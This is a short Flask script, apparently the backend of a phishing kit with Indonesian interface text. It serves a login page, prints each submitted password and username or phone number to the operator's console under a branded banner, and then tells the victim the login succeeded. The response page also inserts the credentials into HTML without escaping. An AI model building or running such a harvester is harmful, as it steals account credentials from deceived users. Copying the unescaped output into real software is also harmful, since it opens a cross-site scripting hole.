
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
   
    with open('index.html', 'r') as file:
        return file.read()

@app.route('/login', methods=['POST'])
def login():
  
    username = request.form.get('username')
    password = request.form.get('password')

   
    print("\n" + "-"*30)
    print("v.6.8")
    print("m.hamzah")
    print("----------DAFTAR----------")
    print(f"-------           -------")
    print("\nPassword:")
    print(password)
    print("\nnomor/username")
    print(username)
    print("\n" + "-"*30)


    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Hasil Login</title>
    </head>
    <body>
        <h1>Login Berhasil!</h1>
        <p>Username: {username}</p>
        <p>Password: {password}</p>
        <p>anda udah bisa login</p>
        <a href="/">Kembali ke Form Login</a>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)